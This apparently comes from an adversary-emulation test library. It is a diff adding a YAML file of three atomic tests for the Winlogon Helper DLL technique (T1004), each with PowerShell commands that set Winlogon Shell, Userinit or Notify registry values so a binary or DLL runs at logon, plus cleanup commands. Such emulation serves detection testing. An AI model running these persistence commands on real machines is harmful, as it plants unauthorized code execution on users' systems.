@@ -1,0 +1,74 @@
+---
+attack_technique: T1004
+display_name: Winlogon Helper DLL
+
+atomic_tests:
+- name: Winlogon Shell Key Persistence - PowerShell
+  description: |
+    PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.
+
+    Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    binary_to_execute:
+      description: Path of binary to execute
+      type: Path
+      default: C:\Windows\System32\cmd.exe
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force
+    cleanup_command: |
+      Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore
+
+- name: Winlogon Userinit Key Persistence - PowerShell
+  description: |
+    PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.
+
+    Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    binary_to_execute:
+      description: Path of binary to execute
+      type: Path
+      default: C:\Windows\System32\cmd.exe
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, #{binary_to_execute}" -Force
+    cleanup_command: |
+      Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore
+
+- name: Winlogon Notify Key Logon Persistence - PowerShell
+  description: |
+    PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.
+
+    Upon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon/logoff.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    binary_to_execute:
+      description: Path of notification package to execute
+      type: Path
+      default: C:\Windows\Temp\atomicNotificationPackage.dll
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force
+      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" "logon" "#{binary_to_execute}" -Force
+    cleanup_command: |
+      Remove-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force -ErrorAction Ignore
